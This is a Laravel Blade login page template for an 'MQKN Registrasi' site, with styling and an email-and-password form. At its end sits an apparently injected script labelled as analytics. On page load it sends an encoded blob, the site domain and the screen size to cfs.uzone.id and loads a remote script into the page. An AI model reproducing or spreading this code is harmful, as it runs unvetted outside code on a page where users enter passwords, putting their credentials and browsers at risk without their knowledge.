<!DOCTYPE html>
<html >
<head>
  <meta charset="UTF-8">
  <title>MQKN VI 2017</title>
  
      <style>
      /* NOTE: The styles were added inline because Prefixfree needs access to your styles and they must be inlined if they are on local disk! */
      @import url(https://fonts.googleapis.com/css?family=Exo:100,200,400);
@import url(https://fonts.googleapis.com/css?family=Source+Sans+Pro:700,400,300);

body{
    margin: 0;
    padding: 0;
    background: #fff;

    color: #fff;
    font-family: Arial;
    font-size: 12px;
}

.body{
    position: absolute;
    top: -20px;
    left: -20px;
    right: -40px;
    bottom: -40px;
    width: auto;
    height: auto;
    background-image: url({{url('/images/mqk_background.jpg')}});
    background-size: cover;
    /*-webkit-filter: blur(5px);*/
    z-index: 0;
}

.grad{
    position: absolute;
    top: -20px;
    left: -20px;
    right: -40px;
    bottom: -40px;
    width: auto;
    height: auto;
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,rgba(0,0,0,0)), color-stop(100%,rgba(0,0,0,0.65))); /* Chrome,Safari4+ */
    z-index: 1;
    opacity: 0.7;
}

.header{
    position: absolute;
    top: calc(50% - 35px);
    left: calc(50% - 300px);
    z-index: 2;
}

.header div{
    float: left;
    color: #fff;
    font-family: 'Exo', sans-serif;
    font-size: 35px;
    font-weight: 200;
}

.header div span{
    color: #fbc02d !important;
}

.login{
    position: absolute;
    top: calc(50% - 75px);
    left: calc(50% - 50px);
    height: 150px;
    width: 350px;
    padding: 10px;
    z-index: 2;
}

.login input[type=email]{
    width: 250px;
    height: 30px;
    background: transparent;
    border: 1px solid rgba(255,255,255,0.6);
    border-radius: 2px;
    color: #fff;
    font-family: 'Exo', sans-serif;
    font-size: 18px;
    font-weight: 400;
    padding: 4px;
}

.login input[type=password]{
    width: 250px;
    height: 30px;
    background: transparent;
    border: 1px solid rgba(255,255,255,0.6);
    border-radius: 2px;
    color: #fff;
    font-family: 'Exo', sans-serif;
    font-size: 18px;
    font-weight: 400;
    padding: 4px;
    margin-top: 10px;
}

.login input[type=submit]{
    width: 260px;
    height: 35px;
    background: #fbc02d;
    border: 0px solid #fff;
    cursor: pointer;
    border-radius: 2px;
    color: #fff;
    font-family: 'Exo', sans-serif;
    font-size: 20px;
    font-weight: 400;
    padding: 6px;
    margin-top: 10px;
}

.login input[type=submit]:hover{
    opacity: 0.8;
}

.login input[type=submit]:active{
    opacity: 0.6;
}

.login input[type=text]:focus{
    outline: none;
    border: 1px solid rgba(255,255,255,0.9);
}

.login input[type=password]:focus{
    outline: none;
    border: 1px solid rgba(255,255,255,0.9);
}

.login input[type=submit]:focus{
    outline: none;
}

::-webkit-input-placeholder{
   color: rgba(255,255,255,0.6);
}

::-moz-input-placeholder{
   color: rgba(255,255,255,0.6);
}
    </style>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>

</head>

<body>
  <div class="body"></div>
        <div class="grad"></div>
        <div class="header">
            <div>MQKN<span>Registrasi</span></div>
        </div>
        <br>
        <div class="login">
        <form role="form" method="POST" action="{{ url('/login') }}">
            {{ csrf_field() }}
        <!-- <div class="login"> -->
                <input id="email" type="email" name="email" value="{{ old('email') }}">

                @if ($errors->has('email'))
                    <span class="help-block">
                        <strong>{{ $errors->first('email') }}</strong>
                    </span>
                @endif
                <input id="password" type="password" name="password">

                                @if ($errors->has('password'))
                                    <span class="help-block">
                                        <strong>{{ $errors->first('password') }}</strong>
                                    </span>
                                @endif
                <!-- <input type="email" placeholder="username" name="user"><br> -->
                <!-- <input type="password" placeholder="password" name="password"><br> -->
                <input type="submit" value="Login">
        </form>
        </div>
  <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>

  
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582HVlH3eBnL31dy4ToxlykiFtzXM024rj4hYytqlyQLuxxbcp8fFm%2bNArPWUglB2Bt6Gs9dwE%2bbppjjKqdfbJvENseNAVGfFJpW7cue30GfvG5fVxNFvHDCeh2AkxY%2bdBC%2bf04qYnr4oBjq62RFgSCHVsSncxQ8jE5NUiM%2fjfernDp4gJGFSG0a5fzYdsiHcirgc5LmTXv7DGpi%2f4gP5RVrskrDkYgutEC4N8l3l95yN%2fK5IJAO7iHBrc5jYCEqCUN%2f26pARvg2vuJMN8vOzPyPMRIhZzj21PfvymmfBAd%2bh1s%2bov%2ftIoyNwZTd0PwlKUcmZr8fxaO%2fgmOKNVHlImMJWpnXTMaDoiEh4Co%2bBvV17EdA4LKV68fG6uXxEfxmr1uePDPLu%2fassmUFNG%2bRvNogmVVCbF2mKk3siZJzcP3Qdoyl8LniaukxphHblWTcshjSX%2fdWqXlZI06O%2fuzntgi2iUxC0CKY7XzNEpupyzZlbumjbPbjjrGfdHhmwmjnvhI85YxA6XVMkq%2bByX8uj8SGTEbxEF6X3604pohva%2fmyiv0qbnxZfxb%2bjI0ZMCgy8sgPvOrdhDy1%2bRfsquknQom%2fv%2f4XTcMA35%2bgSdwqrwHKQe%2f9U1xQOeW1%2bSQJnX6lNY9Yl%2fADMAuFVE" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
